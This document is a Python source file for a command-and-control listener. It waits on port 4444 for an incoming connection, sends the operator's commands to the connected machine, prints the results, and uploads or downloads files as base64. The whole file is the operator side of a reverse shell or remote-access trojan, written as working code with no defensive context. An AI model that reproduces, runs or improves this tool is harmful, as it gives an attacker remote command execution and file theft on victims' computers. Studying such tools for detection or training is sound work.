import socket
from colorama import Fore, Style, init
import json
import base64  # Added imports from provided files

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "0.0.0.0"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

def write_file(path, content):  # Logic from upload_download1.py
    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

def read_file(path):  # Logic from upload_download1.py
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Handle the 'upload' command
        if command.startswith("upload "):
            try:
                _, file_path = command.split(" ", 1)
                file_content = read_file(file_path)
                command = f"{command} {file_content}"  # Append file content to the command
            except Exception as e:
                print(Fore.RED + f"Failed to upload file: {e}")
                continue

        # Send the command to the client
        client_socket.sendall(command.encode("utf-8"))

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        output = client_socket.recv(4096).decode("utf-8")

        # Handle the 'download' command
        if command.startswith("download "):
            try:
                _, file_path = command.split(" ", 1)
                response = write_file(file_path, output)
                print(Fore.GREEN + response)
                continue
            except Exception as e:
                print(Fore.RED + f"Failed to download file: {e}")
                continue
        
        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
